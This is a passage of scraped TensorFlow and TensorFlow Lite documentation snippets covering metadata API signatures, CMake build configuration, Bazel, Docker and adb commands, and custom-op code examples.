  --task_id=${SLURM_PROCID} \
  --num_nodes=${SLURM_NTASKS} \
  --address="${SLURM_LAUNCH_NODE_IPADDR}:12345" \
  /tmp/dump_multi_process/module_0023.pjit__wrapped_step_fn.before_optimizations.txt
```

----------------------------------------

TITLE: Checking for Missing Subgraph Metadata in ModelMetadata
DESCRIPTION: Checks if the list of subgraph metadata entries within the model metadata is empty or not present. Returns a boolean indicating the presence of subgraph metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadata.md#_snippet_13

LANGUAGE: python
CODE:
```
SubgraphMetadataIsNone()
```

----------------------------------------

TITLE: Get Root Object from Buffer Python
DESCRIPTION: Retrieves the root object from a FlatBuffer buffer. This is a generic method used to access the primary data structure within the buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BertTokenizerOptions.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
GetRootAs(
    buf, offset=0
)
```

----------------------------------------

TITLE: Initializing AssociatedFileT Python
DESCRIPTION: Initializes a new instance of the `AssociatedFileT` class. This class is used to represent information about an associated file within the TFLite model metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AssociatedFileT.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.AssociatedFileT()
```

----------------------------------------

TITLE: Predicting with Keras Model in TensorFlow
DESCRIPTION: Generates predictions using a Keras model on a specified dataset. It processes the dataset in steps and returns the model's output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/BertQaSpec.md#_snippet_8

LANGUAGE: python
CODE:
```
predict(
    model, dataset, num_steps
)

```

----------------------------------------

TITLE: Initializing ConfidenceMask object - Python
DESCRIPTION: This snippet shows the signature for initializing a `ConfidenceMask` object. It requires a NumPy 2D array representing the confidence values.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/ConfidenceMask.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.task.processor.ConfidenceMask(
    value: np.ndarray
)
```

----------------------------------------

TITLE: Importing TensorFlow Lite Dependency (Gradle)
DESCRIPTION: Adds the TensorFlow Lite Android interpreter dependency to the module's build.gradle file. The '+' ensures the latest available version is used.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/nnapi.md#_snippet_0

LANGUAGE: groovy
CODE:
```
dependencies {
   implementation 'org.tensorflow:tensorflow-lite:'
}
```

----------------------------------------

TITLE: Getting DataLoader Length (Python)
DESCRIPTION: Implements the `__len__` method, allowing the DataLoader object to be used with the built-in `len()` function. It returns the number of items in the dataset.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/searcher/DataLoader.md#_snippet_2

LANGUAGE: python
CODE:
```
__len__()
```

----------------------------------------

TITLE: Loading Metadata Buffer for Population - Python
DESCRIPTION: This method loads metadata content from a byte buffer into the MetadataPopulator object, preparing it to be embedded in the TensorFlow Lite model. It validates the metadata buffer content, checking for emptiness, correct flatbuffer identifier, minimum parser version, subgraph count, and tensor metadata matching tensor counts, raising ValueError on validation failures.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/MetadataPopulator.md#_snippet_9

LANGUAGE: Python
CODE:
```
load_metadata_buffer(
    metadata_buf
)
```

----------------------------------------

TITLE: Setting TensorFlow Source Directory - CMake
DESCRIPTION: Defines the `TF_SOURCE_DIR` variable. It first checks if the variable is cached; if not, it attempts to determine the absolute path relative to the current CMake file. This variable is crucial for locating TensorFlow and TensorFlow Lite source files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/c/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
set(TF_SOURCE_DIR "" CACHE PATH
  "Directory that contains the TensorFlow project"
)
if (NOT TF_SOURCE_DIR)
  get_filename_component(TF_SOURCE_DIR
    "${CMAKE_CURRENT_LIST_DIR}/../../../"
    ABSOLUTE
  )
endif()
```

----------------------------------------

TITLE: Import Object Detector Metadata Packages (Python)
DESCRIPTION: This snippet imports the necessary Python packages from the tflite_support library for working with object detector metadata. It imports the `object_detector` module for the writer and `writer_utils` for utility functions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
from tflite_support.metadata_writers import object_detector
from tflite_support.metadata_writers import writer_utils
```

----------------------------------------

TITLE: Building TensorFlow Libtensorflow Packages with Bazel Bash
DESCRIPTION: Builds the libtensorflow packages using Bazel inside the Docker container. The --config=libtensorflow_build flag targets the specific build rules; different configurations for CPU/GPU and cache are supported via bazelrc and config flags.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/README.md#_snippet_12

LANGUAGE: Bash
CODE:
```
docker exec tf bazel --bazelrc=/usertools/cpu.bazelrc \
build --config=sigbuild_remote_cache \
--config=libtensorflow_build
```

LANGUAGE: Bash
CODE:
```
docker exec tf bazel --bazelrc=/usertools/gpu.bazelrc \
build --config=sigbuild_remote_cache \
--config=libtensorflow_build
```

LANGUAGE: Bash
CODE:
```
docker exec tf bazel --bazelrc=/usertools/cpu.bazelrc \
build --config=sigbuild_local_cache \
--config=libtensorflow_build
```

LANGUAGE: Bash
CODE:
```
docker exec tf \
bazel --bazelrc=/usertools/gpu.bazelrc \
build --config=sigbuild_local_cache \
--config=libtensorflow_build
```

----------------------------------------

TITLE: Getting DataLoader Length Python
DESCRIPTION: Returns the number of data items currently loaded in the DataLoader instance, typically representing the number of images processed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/searcher/ImageDataLoader.md#_snippet_4

LANGUAGE: python
CODE:
```
__len__()
```

----------------------------------------

TITLE: Conditionally Add GPU Delegate Source (CMake)
DESCRIPTION: This block conditionally appends the GPU delegate provider source file to `TFLITE_BENCHMARK_SRCS` if the `TFLITE_ENABLE_GPU` CMake option is enabled, allowing the benchmark tool to utilize GPU delegation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/CMakeLists.txt#_snippet_7

LANGUAGE: CMake
CODE:
```
if(TFLITE_ENABLE_GPU)
  list(APPEND TFLITE_BENCHMARK_SRCS
    ${TFLITE_SOURCE_DIR}/tools/delegates/gpu_delegate_provider.cc
  )
endif()
```

----------------------------------------

TITLE: Check Buffer Identifier ScoreThresholdingOptions - Python
DESCRIPTION: Checks if the provided buffer contains the correct identifier for a `ScoreThresholdingOptions` FlatBuffer schema. This helps validate the buffer content.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreThresholdingOptions.md#_snippet_4

LANGUAGE: Python
CODE:
```
@classmethod
ScoreThresholdingOptionsBufferHasIdentifier(
    buf, offset, size_prefixed=False
)
```

----------------------------------------

TITLE: Getting Associated Files Count in ModelMetadata
DESCRIPTION: Returns the number of associated files linked to the model metadata. This provides the count of entries available for retrieval.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadata.md#_snippet_2

LANGUAGE: python
CODE:
```
AssociatedFilesLength()
```

----------------------------------------

TITLE: Getting CustomMetadata Data Length in Python
DESCRIPTION: Returns the length of the binary data buffer associated with the `CustomMetadata` object. This indicates the number of bytes or elements available in the data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/CustomMetadata.md#_snippet_4

LANGUAGE: python
CODE:
```
DataLength()
```

----------------------------------------

TITLE: Printing First 250 Characters - Python
DESCRIPTION: This line prints the first 250 characters of the loaded text content. It provides a quick preview of the dataset structure and content.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
print(text[:250])
```

----------------------------------------

TITLE: Packing TensorGroupT Object Python
DESCRIPTION: A method to serialize the current `TensorGroupT` object into a FlatBuffers builder. Requires a FlatBuffers builder instance as input to append the object data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorGroupT.md#_snippet_4

LANGUAGE: python
CODE:
```
Pack(
    builder
)
```

----------------------------------------

TITLE: UNKNOWN Token Constant in AverageWordVecSpec
DESCRIPTION: Represents the constant string used for words not found in the vocabulary. All out-of-vocabulary words are mapped to this token.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/AverageWordVecSpec.md#_snippet_14

LANGUAGE: python
CODE:
```
'<UNKNOWN>'
```

----------------------------------------

TITLE: Get Associated Files Count - TensorMetadata (Python)
DESCRIPTION: Returns the number of associated files linked to this tensor metadata entry. This count is useful for iterating through the list of associated files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadata.md#_snippet_2

LANGUAGE: python
CODE:
```
AssociatedFilesLength()
```

----------------------------------------

TITLE: Initializing ModelMetadataT Class (Python)
DESCRIPTION: The constructor for the `ModelMetadataT` class. It creates an instance of the ModelMetadataT object. It takes no arguments.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadataT.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ModelMetadataT()

```

----------------------------------------

TITLE: Evaluating Text Classification Model in Python
DESCRIPTION: Evaluates the trained text classification model's performance using the test dataset. It returns the loss and accuracy metrics.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_8

LANGUAGE: python
CODE:
```
loss, acc = model.evaluate(test_data)
```

----------------------------------------

TITLE: Helper Function for Retrieving TensorFlow Resource (C++)
DESCRIPTION: Defines a C++ template helper function `GetResource` used by TensorFlow kernels to retrieve a pointer to the `SimpleHashTableResource` object from an input resource handle tensor (`ctx->input(0)`) within the op kernel context.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_12

LANGUAGE: C++
CODE:
```
template <class K, class V>
Status GetResource(OpKernelContext* ctx,
                   SimpleHashTableResource<K, V>** resource) {
  const Tensor& handle_tensor = ctx->input(0);
  const ResourceHandle& handle = handle_tensor.scalar<ResourceHandle>()();
  typedef SimpleHashTableResource<K, V> resource_type;
  TF_ASSIGN_OR_RETURN(*resource, handle.GetResource<resource_type>());
  return OkStatus();
}
```

----------------------------------------

TITLE: Getting Vocab File Length Python
DESCRIPTION: This instance method returns the length of the vocabulary file data field. If the vocabulary file data is a vector, this would return the number of elements.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SentencePieceTokenizerOptions.md#_snippet_9

LANGUAGE: python
CODE:
```
VocabFileLength()
```

----------------------------------------

TITLE: Retrieving Name in Python
DESCRIPTION: Retrieves the name string from the metadata schema. This method provides access to the name associated with the metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_19

LANGUAGE: python
CODE:
```
Name()
```

----------------------------------------

TITLE: Access Vocabulary File Entry Python
DESCRIPTION: Retrieves a specific entry from the vocabulary file list based on its index `j`. Requires the object to be initialized.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BertTokenizerOptions.md#_snippet_4

LANGUAGE: python
CODE:
```
VocabFile(
    j
)
```

----------------------------------------

TITLE: Accessing License Information in ModelMetadata
DESCRIPTION: Retrieves the license information string stored in the model metadata. This method returns details about the model's licensing terms.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadata.md#_snippet_8

LANGUAGE: python
CODE:
```
License()
```

----------------------------------------

TITLE: Getting Subgraph Metadata Count in ModelMetadata
DESCRIPTION: Returns the number of subgraph metadata entries linked to the model metadata. This provides the count of entries available for retrieval.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadata.md#_snippet_14

LANGUAGE: python
CODE:
```
SubgraphMetadataLength()
```

----------------------------------------

TITLE: Defining Dummy TFLite Delegate C API
DESCRIPTION: These C function declarations define the public interface for creating, configuring, and destroying a dummy TensorFlow Lite delegate. They are assumed to be available for the integration methods.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/implementing_delegate.md#_snippet_2

LANGUAGE: C++
CODE:
```
// Returns default options for DummyDelegate.
DummyDelegateOptions TfLiteDummyDelegateOptionsDefault();

// Creates a new delegate instance that need to be destroyed with
// `TfLiteDummyDelegateDelete` when delegate is no longer used by TFLite.
// When `options` is set to `nullptr`, the above default values are used:
TfLiteDelegate* TfLiteDummyDelegateCreate(const DummyDelegateOptions* options);

// Destroys a delegate created with `TfLiteDummyDelegateCreate` call.
void TfLiteDummyDelegateDelete(TfLiteDelegate* delegate);
```

----------------------------------------

TITLE: Defining a Three-Layer Neural Network Model (Python)
DESCRIPTION: Defines a `Model` class that serves as the container for the neural network. It instantiates three `Dense` layers: two with ReLU activation and the final output layer without. The `__call__` method defines the forward pass by applying these layers sequentially, and `params` property collects all trainable variables.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_Numpy_Distributed_Image_Classification.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
class Model(tf.Module):
  """A  three layer neural network."""

  def __init__(self):
    self.layer1 = Dense(128)
    self.layer2 = Dense(32)
    self.layer3 = Dense(NUM_CLASSES, use_relu=False)

  def __call__(self, inputs):
    x = self.layer1(inputs)
    x = self.layer2(x)
    return self.layer3(x)

  @property
  def params(self):
    return self.layer1.params + self.layer2.params + self.layer3.params
```

----------------------------------------

TITLE: Adding Kernel Tests with gtest Main in CMake
DESCRIPTION: Iterates through the `TEST_WITH_GTEST_MAIN_LIST` variable, adding a kernel test target for each source file. These tests use the Google Test framework's provided `main` entry point.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/kernels/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
foreach(test_src IN LISTS TEST_WITH_GTEST_MAIN_LIST)
  add_kernel_test(${test_src} tensorflow-lite-test-gtest-main)
endforeach()
```

----------------------------------------

TITLE: Generating Tulsi Xcode Project Shell
DESCRIPTION: Runs the Tulsi script to create an Xcode project file (`.xcodeproj`) from a Bazel configuration (`.tulsiproj`), enabling development and debugging within Xcode.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/objc/README.md#_snippet_8

LANGUAGE: shell
CODE:
```
generate_xcodeproj.sh --genconfig tensorflow/lite/objc/TensorFlowLite.tulsiproj:TensorFlowLite --outputfolder ~/path/to/generated/TensorFlowLite.xcodeproj
```

----------------------------------------

TITLE: Comparing TextSearcherOptions Instances (Python)
DESCRIPTION: Compares two TextSearcherOptions instances for equality. This method is part of the standard Python object protocol and returns True if the instances represent the same configuration, False otherwise. It takes another object as input for comparison.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/TextSearcherOptions.md#_snippet_1

LANGUAGE: python
CODE:
```
__eq__(
    other
)
```

----------------------------------------

TITLE: Visualizing TFLite Model (Bazel) (Shell)
DESCRIPTION: This command visualizes a TensorFlow Lite (`.tflite`) model using the `visualize.py` script executed via Bazel. This method is for TensorFlow versions older than 2.5 or when using a Bazel build environment. It requires cloning the TensorFlow repository and using the Bazel build tool.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/faq.md#_snippet_2

LANGUAGE: shell
CODE:
```
bazel run //tensorflow/lite/tools:visualize model.tflite visualized_model.html
```

----------------------------------------

TITLE: Make Evaluation Binary Executable - Android Shell
DESCRIPTION: Sets the execute permission for the `run_eval` binary located in the temporary directory on the Android device using `chmod` via ADB shell.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/coco_object_detection/README.md#_snippet_3

LANGUAGE: Shell
CODE:
```
adb shell chmod +x /data/local/tmp/run_eval
```

----------------------------------------

TITLE: Check Benchmark Completion via ADB Logcat (Tracing)
DESCRIPTION: After starting a benchmark run with tracing enabled, this command filters logcat for 'Inference timings in us' to confirm that the benchmark process has completed and output its results before stopping the system trace.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/android/README.md#_snippet_9

LANGUAGE: Shell
CODE:
```
adb logcat | grep "Inference timings in us"
```

----------------------------------------

TITLE: TfLiteCoreMlDelegateOptions C++ Struct Definition (C++)
DESCRIPTION: Defines the C-style struct used to configure the Core ML delegate via its C API. It includes options for enabled devices, target Core ML version, maximum delegated partitions, and minimum nodes per partition.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/coreml/README.md#_snippet_5

LANGUAGE: C++
CODE:
```
typedef struct {
  // Only create delegate when Neural Engine is available on the device.
  TfLiteCoreMlDelegateEnabledDevices enabled_devices;
  // Specifies target Core ML version for model conversion.
  // Core ML 3 come with a lot more ops, but some ops (e.g. reshape) is not
  // delegated due to input rank constraint.
  // if not set to one of the valid versions, the delegate will use highest
  // version possible in the platform.
  // Valid versions: (2, 3)
  int coreml_version;
  // This sets the maximum number of Core ML delegates created.
  // Each graph corresponds to one delegated node subset in the
  // TFLite model. Set this to 0 to delegate all possible partitions.
  int max_delegated_partitions;
  // This sets the minimum number of nodes per partition delegated with
  // Core ML delegate. Defaults to 2.
  int min_nodes_per_partition;
#ifdef TFLITE_DEBUG_DELEGATE
  // This sets the index of the first node that could be delegated.
  int first_delegate_node_index;
  // This sets the index of the last node that could be delegated.
  int last_delegate_node_index;
#endif
} TfLiteCoreMlDelegateOptions;
```

----------------------------------------

TITLE: Performing Conditional Selection with Eigen (C++)
DESCRIPTION: Illustrates the core computation line using Eigen's `select` function. This function performs the element-wise selection based on the boolean `cond` tensor, choosing values from `a_values` where true and `b_values` where false, and writing the result to the `output` tensor, leveraging the specified device.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_2/README.md#_snippet_5

LANGUAGE: cpp
CODE:
```
output.device(ctx->eigen_device<Device>()) =
     cond.select(a_values, b_values);
```

----------------------------------------

TITLE: Add Custom Metadata to Subgraph TFLite Python
DESCRIPTION: This function is used to add custom metadata to a subgraph's metadata object using a FlatBuffers builder. It requires a builder instance and the custom metadata object to be added. It typically operates within the process of building a complete TFLite model metadata structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataAddCustomMetadata.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.SubGraphMetadataAddCustomMetadata(
    builder, customMetadata
)
```

----------------------------------------

TITLE: Starting Custom Metadata Vector in TFLite Metadata - Python
DESCRIPTION: Documents the `SubGraphMetadataStartCustomMetadataVector` function in the `tflite_support` library. This Python function is used when building TFLite metadata using a FlatBuffers builder. It initiates the creation of a vector (list) for custom metadata associated with a subgraph, requiring the builder instance and the intended number of elements in the vector.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataStartCustomMetadataVector.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.SubGraphMetadataStartCustomMetadataVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Tracing Behavior with tf.Tensor Condition - TensorFlow Python
DESCRIPTION: Code demonstrating the tracing process when an `if` statement's condition is a `tf.Tensor`. During graph construction, both the true and false branches are visited by the tracer, leading to the execution of side effects like `print` statements in both branches during tracing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_8

LANGUAGE: Python
CODE:
```
print('before if')
if tf.constant(True):
  print('true branch')
else:
  print('false branch')
print('after if')
```

----------------------------------------

TITLE: Using TFLite Compatible Decorator - Python
DESCRIPTION: This example demonstrates how to apply the `@tf.lite.experimental.authoring.compatible` decorator to a `@tf.function`. It defines a function `f` with a float32 input signature and applies both decorators. When called with a tensor, it performs the operation and prints a compatibility warning if any operations are not natively supported by TFLite, requiring 'Select TF Ops'.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/experimental/authoring/compatible.md#_snippet_1

LANGUAGE: python
CODE:
```
@tf.lite.experimental.authoring.compatible
@tf.function(input_signature=[
    tf.TensorSpec(shape=[None], dtype=tf.float32)
])
def f(x):
    return tf.cosh(x)

result = f(tf.constant([0.0]))
# COMPATIBILITY WARNING: op 'tf.Cosh' require(s) "Select TF Ops" for model
# conversion for TensorFlow Lite.
# Op: tf.Cosh
#   - tensorflow/python/framework/op_def_library.py:748
#   - tensorflow/python/ops/gen_math_ops.py:2458
#   - <stdin>:6
```

----------------------------------------

TITLE: Specify NVIDIA CUDA and CuDNN Dependencies - Configuration
DESCRIPTION: This snippet defines the exact versions of `libcudnn9` and `cuda-compiler` packages to be installed. It targets CuDNN 9.1.1.17 for CUDA 12 and ensures a `cuda-compiler` version of at least 12.3.2 to avoid a known bug in older versions. This configuration is typically used within package installation scripts or Dockerfiles.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/ci/official/containers/linux_arm64/cuda.packages.txt#_snippet_0

LANGUAGE: Configuration
CODE:
```
libcudnn9-dev-cuda-12=9.1.1.17-1
libcudnn9-cuda-12=9.1.1.17-1
cuda-compiler-12-3=12.3.2-1
```

----------------------------------------

TITLE: Checking ARM CPU Capability (sh)
DESCRIPTION: Run `cat /proc/cpuinfo` on the target ARM device to get detailed information about the processor, including architecture version (e.g., ARMv7), features (e.g., neon, vfpv4), and revision, which helps in setting appropriate build flags.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake_arm.md#_snippet_1

LANGUAGE: sh
CODE:
```
cat /proc/cpuinfo
```

----------------------------------------

TITLE: Writing TensorFlow C++ Gradient Test
DESCRIPTION: Demonstrates how to write a unit test for a C++ gradient implementation using the `TEST_F` macro and the gradient checker via `RunTest`. It sets up input tensors using `Placeholder`, applies the operation under test (`Identity`), and then calls `RunTest` to verify the gradient calculation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/cc/gradients/README.md#_snippet_1

LANGUAGE: C++
CODE:
```
TEST_F(ArrayGradTest, IdentityGrad) {
      TensorShape shape({5, 2});
      auto x = Placeholder(scope_, DT_FLOAT, Placeholder::Shape(shape));
      auto y = Identity(scope_, x);
      RunTest(x, shape, y, shape);
    }
```

----------------------------------------

TITLE: Conditionally Add XNNPACK Delegate Source (CMake)
DESCRIPTION: This conditional block checks if the `TFLITE_ENABLE_XNNPACK` CMake option is enabled. If true, it adds the XNNPACK delegate provider and plugin sources; otherwise, it defines a preprocessor option `TFLITE_WITHOUT_XNNPACK` for compilation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/CMakeLists.txt#_snippet_4

LANGUAGE: CMake
CODE:
```
if(TFLITE_ENABLE_XNNPACK)
  list(APPEND TFLITE_BENCHMARK_SRCS
    ${TFLITE_SOURCE_DIR}/tools/delegates/xnnpack_delegate_provider.cc
    ${TFLITE_SOURCE_DIR}/core/acceleration/configuration/c/xnnpack_plugin.cc)
else()
  set(TFLITE_BENCHMARK_CC_OPTIONS "-DTFLITE_WITHOUT_XNNPACK")
endif()
```

----------------------------------------

TITLE: Creating Stable Delegate Acceleration Test Config on Android (Bash)
DESCRIPTION: Creates a configuration file named stable_delegate_acceleration_test_config.json on the Android device via adb shell, listing the TFLite models and operations supported by the sample delegate for acceleration testing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/utils/experimental/sample_stable_delegate/README.md#_snippet_2

LANGUAGE: bash
CODE:
```
adb shell 'echo "
  # The sample stable delegate supports static-sized addition and subtraction operations.
  FloatSubOpModel.NoActivation
  FloatSubOpModel.VariousInputShapes
  FloatAddOpModel.NoActivation
  FloatAddOpModel.VariousInputShapes
"> /data/local/tmp/stable_delegate_acceleration_test_config.json'
```

----------------------------------------

TITLE: Configuring Sparse Checkout for Text Classification (Shell)
DESCRIPTION: Navigates into the cloned examples directory and initializes Git sparse checkout. It then configures sparse checkout to specifically include only the files and directories relevant to the Android text classification example application, saving disk space and time. This is an optional step to get just the required code.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/text_classification.md#_snippet_1

LANGUAGE: Shell
CODE:
```
cd examples\ngit sparse-checkout init --cone\ngit sparse-checkout set lite/examples/text_classification/android
```

----------------------------------------

TITLE: Retrieving AssociatedFile Description (Python)
DESCRIPTION: Retrieves the human-readable description string stored within the `AssociatedFile` object. This method takes no arguments and provides details about the content or purpose of the associated file. It returns a string representing the description.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AssociatedFile.md#_snippet_1

LANGUAGE: python
CODE:
```
Description()
```

----------------------------------------

TITLE: Build TFLite Pip via Docker/Make - x86_64 (Shell)
DESCRIPTION: Executes a Docker-based build for the TensorFlow Lite pip package using `make`. This command targets the native x86_64 architecture (`TENSORFLOW_TARGET`) using Ubuntu 18.04 (`BASE_IMAGE`) and Python 3.6 (`PYTHON_VERSION`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/pip_package/README.md#_snippet_4

LANGUAGE: sh
CODE:
```
make BASE_IMAGE=ubuntu:18.04 PYTHON_VERSION=3.6 TENSORFLOW_TARGET=native docker-build
```

----------------------------------------

TITLE: Creating Float16 Quantization Config Python
DESCRIPTION: Creates a configuration object pre-set for float16 post-training quantization. This convenience class method configures the `QuantizationConfig` specifically for converting models to use the float16 data type.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/config/QuantizationConfig.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
for_float16()
```

----------------------------------------

TITLE: Accessing Description in ModelMetadata
DESCRIPTION: Retrieves the description string associated with the model metadata. This method returns a textual description of the model's purpose or content.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadata.md#_snippet_4

LANGUAGE: python
CODE:
```
Description()
```

----------------------------------------

TITLE: Instantiating Custom Adam Optimizer Python
DESCRIPTION: This snippet instantiates the custom Adam optimizer class, preparing it for use in a training loop.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_31

LANGUAGE: python
CODE:
```
optimizer = Adam()
```

----------------------------------------

TITLE: Defining Multi-Length List Inputs for TensorFlow Op (C++)
DESCRIPTION: Demonstrates how to define multiple input lists with different fixed lengths for a custom TensorFlow op. It uses separate integer attributes (`short_len`, `long_len`) to specify the length for each list (`short_list`, `long_list`), offering flexibility beyond a single length attribute.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_4/README.md#_snippet_2

LANGUAGE: C++
CODE:
```
.Input("short_list: short_len * float")
.Input("long_list: long_len * float")
.Attr("short_len: int = 1")
.Attr("long_len: int >= 10")

```

----------------------------------------

TITLE: Initializing ScoreThresholdingOptionsT from Buffer in Python
DESCRIPTION: This class method initializes a `ScoreThresholdingOptionsT` object by deserializing data from a provided buffer starting at a specific position. It is typically used when reading data from a FlatBuffers buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreThresholdingOptionsT.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
InitFromBuf(
    buf, pos
)
```

----------------------------------------

TITLE: Setting Minimum CMake Version and Build Type
DESCRIPTION: This snippet sets the minimum required CMake version to 3.16 and defaults the build type to 'Release' if it hasn't been explicitly set. It provides guidance on how to set a debug build type.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
cmake_minimum_required(VERSION 3.16)
if(NOT CMAKE_BUILD_TYPE)
  message(STATUS "Setting build type to Release, for debug builds use"
    "'-DCMAKE_BUILD_TYPE=Debug'.")
  set(CMAKE_BUILD_TYPE "Release")
endif()
```

----------------------------------------

TITLE: Cloning TensorFlow Examples Repository (Shell)
